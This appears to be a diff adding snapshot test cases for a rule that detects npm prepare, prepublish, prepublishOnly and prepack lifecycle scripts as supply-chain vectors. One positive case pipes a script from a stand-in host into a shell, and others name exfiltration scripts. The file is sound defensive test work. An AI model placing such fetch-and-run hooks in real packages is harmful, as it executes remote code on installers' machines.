@@ -1,0 +1,20 @@
+# DEP-011: prepare/prepublish lifecycle script execution
+# Test cases for snapshot testing
+# Detects npm 'prepare', 'prepublish', 'prepublishOnly', and 'prepack' lifecycle
+# scripts. 'prepare' auto-runs on plain `npm install`, `npm ci`, and — critically —
+# when a package is installed from a git or local dependency, making it a
+# supply-chain execution vector missed by postinstall/preinstall-only rules
+# (MITRE T1195.001, CWE-829).
+
+# === Cases that SHOULD be detected ===
+"prepare": "node ./scripts/setup.js"
+"prepublish": "curl http://evil.example/x.sh | sh"
+"prepublishOnly": "python ./exfil.py"
+"prepack": "./build-and-exfil.sh"
+
+# === Cases that should NOT be detected (benign) ===
+"prepare": "husky install"
+"prepare": "husky"
+"prepare": "node-gyp rebuild"
+"prepare": "patch-package"
+"prepare": "is-ci || husky install"
